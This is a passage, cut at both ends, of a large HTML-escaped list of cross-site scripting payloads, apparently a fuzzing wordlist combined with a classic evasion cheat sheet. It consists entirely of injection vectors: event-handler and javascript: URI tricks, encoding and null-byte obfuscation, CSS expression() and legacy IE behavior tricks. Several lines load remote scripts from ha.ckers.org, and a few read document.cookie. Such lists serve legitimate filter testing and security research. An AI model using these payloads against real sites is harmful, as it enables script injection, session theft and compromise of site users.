onerror=javascript:alert(('A'))&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert('A')&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert((\"A\"))&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert(\"A\")&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert((`A`))&gt;\n\"&gt;&lt;img src=x onerror=javascript:alert(`A`)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0B=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x00=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0C=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0D=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x20=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0A=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x09=javascript:alert(1)&gt;\n&lt;script&gt;javascript:alert(1)&lt;\\x00/script&gt;\n&lt;img src=# onerror\\x3D\"javascript:alert(1)\" &gt;\n&lt;input onfocus=javascript:alert(1) autofocus&gt;\n&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;\n&lt;video poster=javascript:javascript:alert(1)//\n&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;\n&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X\n&lt;video&gt;&lt;source onerror=\"javascript:javascript:alert(1)\"&gt;\n&lt;video onerror=\"javascript:javascript:alert(1)\"&gt;&lt;source&gt;\n&lt;form&gt;&lt;button formaction=\"javascript:javascript:alert(1)\"&gt;X\n&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;\n&lt;math href=\"javascript:javascript:alert(1)\"&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:javascript:alert(1)\"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;\n&lt;frameset onload=javascript:alert(1)&gt;\n&lt;table background=\"javascript:javascript:alert(1)\"&gt;\n&lt;!--&lt;img src=\"--&gt;&lt;img src=x onerror=javascript:alert(1)//\"&gt;\n&lt;comment&gt;&lt;img src=\"&lt;/comment&gt;&lt;img src=x onerror=javascript:alert(1))//\"&gt;\n&lt;![&gt;&lt;img src=\"]&gt;&lt;img src=x onerror=javascript:alert(1)//\"&gt;\n&lt;style&gt;&lt;img src=\"&lt;/style&gt;&lt;img src=x onerror=javascript:alert(1)//\"&gt;\n&lt;li style=list-style:url() onerror=javascript:alert(1)&gt; &lt;div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)&gt;&lt;/div&gt;\n&lt;head&gt;&lt;base href=\"javascript://\"&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=\"/. /,javascript:alert(1)//#\"&gt;XXX&lt;/a&gt;&lt;/body&gt;\n&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;\n&lt;OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"&gt;&lt;PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"&gt;&lt;/OBJECT&gt;\n&lt;object data=\"data:text/html;base64,%(base64)s\"&gt;\n&lt;embed src=\"data:text/html;base64,%(base64)s\"&gt;\n&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0\n&lt;div id=\"div1\"&gt;&lt;input value=\"``onmouseover=javascript:alert(1)\"&gt;&lt;/div&gt; &lt;div id=\"div2\"&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;&lt;/script&gt;\n&lt;x '=\"foo\"&gt;&lt;x foo='&gt;&lt;img src=x onerror=javascript:alert(1)//'&gt;\n&lt;embed src=\"javascript:alert(1)\"&gt;\n&lt;img src=\"javascript:alert(1)\"&gt;\n&lt;image src=\"javascript:alert(1)\"&gt;\n&lt;script src=\"javascript:alert(1)\"&gt;\n&lt;div style=width:1px;filter:glow onfilterchange=javascript:alert(1)&gt;x\n&lt;? foo=\"&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;! foo=\"&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;/ foo=\"&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;? foo=\"&gt;&lt;x foo='?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;'&gt;\"&gt;\n&lt;! foo=\"[[[Inception]]\"&gt;&lt;x foo=\"]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;% foo&gt;&lt;x foo=\"%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;div id=d&gt;&lt;x xmlns=\"&gt;&lt;iframe onload=javascript:alert(1)\"&gt;&lt;/div&gt; &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;\n&lt;img \\x00src=x onerror=\"alert(1)\"&gt;\n&lt;img \\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x11src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x12src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x10src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x13src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x32src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x11src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x34src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x39src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x00src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x09=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x10=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x13=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x32=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x12=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x11=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x00=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x47=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x09onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x10onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x11onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x12onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x13onerror=\"javascript:alert(1)\"&gt;\n&lt;img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\"&gt;\n&lt;img src=x onerror=\\x09\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x10\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x11\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x12\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x32\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x00\"javascript:alert(1)\"&gt;\n&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;\n&lt;img src=\"x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"` `&gt;\n&lt;img src onerror /\" '\"= alt=javascript:alert(1)//\"&gt;\n&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;\n&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt=\"`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;\"&gt;\n&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;\n&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;\n&lt;script src=\"/\\%(jscript)s\"&gt;&lt;/script&gt;\n&lt;script src=\"\\\\%(jscript)s\"&gt;&lt;/script&gt;\n&lt;object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"&gt;&lt;/object&gt; &lt;object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"javascript:alert(1)\" style=\"behavior:url(#x);\"&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;\n&lt;a style=\"-o-link:'javascript:javascript:alert(1)';-o-link-source:current\"&gt;X\n&lt;style&gt;p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};&lt;/style&gt;\n&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d\n&lt;style&gt;@import \"data:,*%7bx:expression(javascript:alert(1))%7D\";&lt;/style&gt;\n&lt;a style=\"pointer-events:none;position:absolute;\"&gt;&lt;a style=\"position:absolute;\" onclick=\"javascript:alert(1);\"&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a href=\"javascript:javascript:alert(1)\"&gt;XXX&lt;/a&gt;\n&lt;style&gt;*[{}@import'%(css)s?]&lt;/style&gt;X\n&lt;div style=\"font-family:'foo&amp;#10;;color:red;';\"&gt;XXX\n&lt;div style=\"font-family:foo}color=red;\"&gt;XXX\n&lt;// style=x:expression\\28javascript:alert(1)\\29&gt;\n&lt;style&gt;*{x:\uff45\uff58\uff50\uff52\uff45\uff53\uff53\uff49\uff4f\uff4e(javascript:alert(1))}&lt;/style&gt;\n&lt;div style=content:url(%(svg)s)&gt;&lt;/div&gt;\n&lt;div style=\"list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));\"&gt;X\n&lt;div id=d&gt;&lt;div style=\"font-family:'sans\\27\\3B color\\3Ared\\3B'\"&gt;X&lt;/div&gt;&lt;/div&gt; &lt;script&gt;with(document.getElementById(\"d\"))innerHTML=innerHTML&lt;/script&gt;\n&lt;div style=\"background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);\"&gt;X\n&lt;div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\"&gt;X\n&lt;div id=\"x\"&gt;XXX&lt;/div&gt; &lt;style&gt;  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  &lt;/style&gt;\n&lt;x style=\"background:url('x&amp;#1;;color:red;/*')\"&gt;XXX&lt;/x&gt;\n&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;\n&lt;script&gt;({0:#0=eval/#0#/#0#(javascript:alert(1))})&lt;/script&gt;\n&lt;script&gt;ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x&lt;/script&gt;\n&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()&lt;/script&gt;\n&lt;meta charset=\"x-imap4-modified-utf7\"&gt;&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi\n&lt;meta charset=\"x-imap4-modified-utf7\"&gt;&amp;&lt;script&amp;S1&amp;TS&amp;1&gt;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;\n&lt;meta charset=\"mac-farsi\"&gt;\u00bcscript\u00bejavascript:alert(1)\u00bc/script\u00be\nX&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;\n1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&amp;#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=javascript:alert(1)&amp;gt;`&gt;\n1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&amp;lt;img/src=&amp;quot;.&amp;quot;onerror=javascript:alert(1)&amp;gt;&gt;\n&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss&gt;&lt;/vmlframe&gt;\n1&lt;a href=#&gt;&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;&lt;/a&gt;\n&lt;a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:javascript:alert(1)\"&gt;XXX&lt;/a&gt;\n&lt;x style=\"behavior:url(%(sct)s)\"&gt;\n&lt;xml id=\"xss\" src=\"%(htc)s\"&gt;&lt;/xml&gt; &lt;label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"&gt;&lt;/label&gt;\n&lt;event-source src=\"%(event)s\" onload=\"javascript:alert(1)\"&gt;\n&lt;a href=\"javascript:javascript:alert(1)\"&gt;&lt;event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\"&gt;\n&lt;div id=\"x\"&gt;x&lt;/div&gt; &lt;xml:namespace prefix=\"t\"&gt; &lt;import namespace=\"t\" implementation=\"#default#time2\"&gt; &lt;t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=javascript:alert(1)&amp;gt;\"&gt;\n&lt;script&gt;%(payload)s&lt;/script&gt;\n&lt;script src=%(jscript)s&gt;&lt;/script&gt;\n&lt;script language='javascript' src='%(jscript)s'&gt;&lt;/script&gt;\n&lt;script&gt;javascript:alert(1)&lt;/script&gt;\n&lt;IMG SRC=\"javascript:javascript:alert(1);\"&gt;\n&lt;IMG SRC=javascript:javascript:alert(1)&gt;\n&lt;IMG SRC=`javascript:javascript:alert(1)`&gt;\n&lt;SCRIPT SRC=%(jscript)s?&lt;B&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:javascript:alert(1);\"&gt;&lt;/FRAMESET&gt;\n&lt;BODY ONLOAD=javascript:alert(1)&gt;\n&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;\n&lt;IMG SRC=\"jav ascript:javascript:alert(1);\"&gt;\n&lt;BODY onload!#$%%&amp;()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)&gt;\n&lt;SCRIPT/SRC=\"%(jscript)s\"&gt;&lt;/SCRIPT&gt;\n&lt;&lt;SCRIPT&gt;%(payload)s//&lt;&lt;/SCRIPT&gt;\n&lt;IMG SRC=\"javascript:javascript:alert(1)\"\n&lt;iframe src=%(scriptlet)s &lt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:javascript:alert(1);\"&gt;\n&lt;IMG DYNSRC=\"javascript:javascript:alert(1)\"&gt;\n&lt;IMG LOWSRC=\"javascript:javascript:alert(1)\"&gt;\n&lt;BGSOUND SRC=\"javascript:javascript:alert(1);\"&gt;\n&lt;BR SIZE=\"&amp;{javascript:alert(1)}\"&gt;\n&lt;LAYER SRC=\"%(scriptlet)s\"&gt;&lt;/LAYER&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"javascript:javascript:alert(1);\"&gt;\n&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;\n&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;%(css)s&gt;; REL=stylesheet\"&gt;\n&lt;XSS STYLE=\"behavior: url(%(htc)s);\"&gt;\n&lt;STYLE&gt;li {list-style-image: url(\"javascript:javascript:alert(1)\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:javascript:alert(1);\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:javascript:alert(1);\"&gt;\n&lt;IFRAME SRC=\"javascript:javascript:alert(1);\"&gt;&lt;/IFRAME&gt;\n&lt;TABLE BACKGROUND=\"javascript:javascript:alert(1)\"&gt;\n&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript:javascript:alert(1)\"&gt;\n&lt;DIV STYLE=\"background-image: url(javascript:javascript:alert(1))\"&gt;\n&lt;DIV STYLE=\"width:expression(javascript:alert(1));\"&gt;\n&lt;IMG STYLE=\"xss:expr/*XSS*/ession(javascript:alert(1))\"&gt;\n&lt;XSS STYLE=\"xss:expression(javascript:alert(1))\"&gt;\n&lt;STYLE TYPE=\"text/javascript\"&gt;javascript:alert(1);&lt;/STYLE&gt;\n&lt;STYLE&gt;.XSS{background-image:url(\"javascript:javascript:alert(1)\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;\n&lt;STYLE type=\"text/css\"&gt;BODY{background:url(\"javascript:javascript:alert(1)\")}&lt;/STYLE&gt;\n&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;javascript:alert(1);&lt;/SCRIPT&gt;&lt;![endif]--&gt;\n&lt;BASE HREF=\"javascript:javascript:alert(1);//\"&gt;\n&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"%(scriptlet)s\"&gt;&lt;/OBJECT&gt;\n&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;\n&lt;HTML xmlns:xss&gt;&lt;?import namespace=\"xss\" implementation=\"%(htc)s\"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;\"\"\",\"XML namespace.\"),(\"\"\"&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=\"javas&lt;!-- --&gt;cript:javascript:alert(1)\"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;\n&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"&gt;&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;&lt;t:set attributeName=\"innerHTML\" to=\"XSS&amp;lt;SCRIPT DEFER&amp;gt;javascript:alert(1)&amp;lt;/SCRIPT&amp;gt;\"&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n&lt;SCRIPT SRC=\"%(jpg)s\"&gt;&lt;/SCRIPT&gt;\n&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-\n&lt;form id=\"test\" /&gt;&lt;button form=\"test\" formaction=\"javascript:javascript:alert(1)\"&gt;X\n&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;\n&lt;P STYLE=\"behavior:url('#default#time2')\" end=\"0\" onEnd=\"javascript:alert(1)\"&gt;\n&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;\n&lt;STYLE&gt;a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}&lt;/STYLE&gt;\n&lt;meta charset= \"x-imap4-modified-utf7\"&amp;&amp;&gt;&amp;&amp;&lt;script&amp;&amp;&gt;javascript:alert(1)&amp;&amp;;&amp;&amp;&lt;&amp;&amp;/script&amp;&amp;&gt;\n&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;\n&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;\n&lt;?xml version=\"1.0\"?&gt;&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;\n&lt;embed code=%(scriptlet)s&gt;&lt;/embed&gt;\n&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;\n&lt;embed src=%(jscript)s&gt;&lt;/embed&gt;\n&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;\n&lt;object onerror=javascript:javascript:alert(1)&gt;\n&lt;embed type=\"image\" src=%(scriptlet)s&gt;&lt;/embed&gt;\n&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=\"javas]]&lt;![CDATA[cript:javascript:alert(1);\"&gt;]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;\n&lt;IMG SRC=&amp;{javascript:alert(1);};&gt;\n&lt;a href=\"jav&amp;#65ascript:javascript:alert(1)\"&gt;test1&lt;/a&gt;\n&lt;a href=\"jav&amp;#97ascript:javascript:alert(1)\"&gt;test1&lt;/a&gt;\n&lt;embed width=500 height=500 code=\"data:text/html,&lt;script&gt;%(payload)s&lt;/script&gt;\"&gt;&lt;/embed&gt;\n&lt;iframe srcdoc=\"&amp;LT;iframe&amp;sol;srcdoc=&amp;amp;lt;img&amp;sol;src=&amp;amp;apos;&amp;amp;apos;onerror=javascript:alert(1)&amp;amp;gt;&gt;\"&gt;\n';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n'';!--\"&lt;XSS&gt;=&amp;{()}\n&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;\n&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;\n&lt;IMG SRC=javascript:alert(\"XSS\")&gt;\n&lt;IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`&gt;\n&lt;a onmouseover=\"alert(document.cookie)\"&gt;xxs link&lt;/a&gt;\n&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;\n&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;\n&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;\n&lt;IMG SRC=# onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG SRC= onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;\n&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;\n&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n&lt;IMG SRC=\"jav ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\"&gt;\nperl -e 'print \"&lt;IMG SRC=java\\0script:alert(\\\"XSS\\\")&gt;\";' &gt; out\n&lt;IMG SRC=\" &amp;#14;  javascript:alert('XSS');\"&gt;\n&lt;SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")&gt;\n&lt;SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;\n&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;\n&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;\n&lt;IMG SRC=\"javascript:alert('XSS')\"\n&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;\n\\\";alert('XSS');//\n&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\"&gt;\n&lt;BODY BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;IMG DYNSRC=\"javascript:alert('XSS')\"&gt;\n&lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;\n&lt;STYLE&gt;li {list-style-image: url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;\n&lt;IMG SRC='vbscript:msgbox(\"XSS\")'&gt;\n&lt;IMG SRC=\"livescript:[code]\"&gt;\n&lt;BODY ONLOAD=alert('XSS')&gt;\n&lt;BGSOUND SRC=\"javascript:alert('XSS');\"&gt;\n&lt;BR SIZE=\"&amp;{alert('XSS')}\"&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\"&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\"&gt;\n&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;\n&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet\"&gt;\n&lt;STYLE&gt;BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}&lt;/STYLE&gt;\n&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';&lt;/STYLE&gt;\n&lt;IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"&gt;\nexp/*&lt;A STYLE='no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'&gt;\n&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;\n&lt;STYLE&gt;.XSS{background-image:url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;\n&lt;STYLE type=\"text/css\"&gt;BODY{background:url(\"javascript:alert('XSS')\")}&lt;/STYLE&gt;\n&lt;STYLE type=\"text/css\"&gt;BODY{background:url(\"javascript:alert('XSS')\")}&lt;/STYLE&gt;\n&lt;XSS STYLE=\"xss:expression(alert('XSS'))\"&gt;\n&lt;XSS STYLE=\"behavior: url(xss.htc);\"&gt;\n\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" 